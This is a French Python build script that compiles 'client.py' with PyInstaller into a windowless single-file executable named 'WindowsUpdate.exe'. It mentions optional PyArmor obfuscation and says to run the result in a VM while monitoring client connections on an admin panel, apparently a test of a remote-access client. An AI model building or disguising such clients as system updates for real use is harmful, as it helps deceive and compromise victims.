"""
Script simple pour compiler client.py en .exe
Sans obfuscation PyArmor (build rapide)
"""

import subprocess
import sys
from pathlib import Path

def build_simple():
    print("="*60)
    print("🔨 BUILD CLIENT - VERSION SIMPLE (SANS OBFUSCATION)")
    print("="*60)
    
    project_dir = Path(__file__).parent
    client_file = project_dir / "client.py"
    
    if not client_file.exists():
        print(f"❌ client.py introuvable")
        return False
    
    print("\n📦 Compilation avec PyInstaller...")
    print("   Cela peut prendre quelques minutes...")
    
    # Commande PyInstaller simple
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",  # Un seul fichier exe
        "--noconsole",  # Pas de console
        "--name", "WindowsUpdate",  # Nom de l'exe
        "--icon", "NONE",  # Pas d'icône
        "--clean",  # Nettoyer les anciens builds
        str(client_file)
    ]
    
    try:
        result = subprocess.run(cmd, cwd=project_dir, capture_output=True, text=True)
        
        if result.returncode == 0:
            exe_path = project_dir / "dist" / "WindowsUpdate.exe"
            if exe_path.exists():
                size_mb = exe_path.stat().st_size / (1024 * 1024)
                print("\n" + "="*60)
                print("✅ BUILD RÉUSSI!")
                print("="*60)
                print(f"\n📂 Emplacement: {exe_path}")
                print(f"📏 Taille: {size_mb:.2f} MB")
                print(f"\n🚀 Vous pouvez maintenant:")
                print(f"   1. Envoyer {exe_path} à votre VM")
                print(f"   2. Exécuter l'exe dans la VM")
                print(f"   3. Surveiller les connexions sur http://localhost:5000/admin/clients")
                return True
            else:
                print(f"❌ L'exe n'a pas été créé")
                return False
        else:
            print(f"❌ Erreur de compilation:")
            print(result.stderr)
            return False
            
    except Exception as e:
        print(f"❌ Erreur: {e}")
        return False


if __name__ == "__main__":
    success = build_simple()
    sys.exit(0 if success else 1)
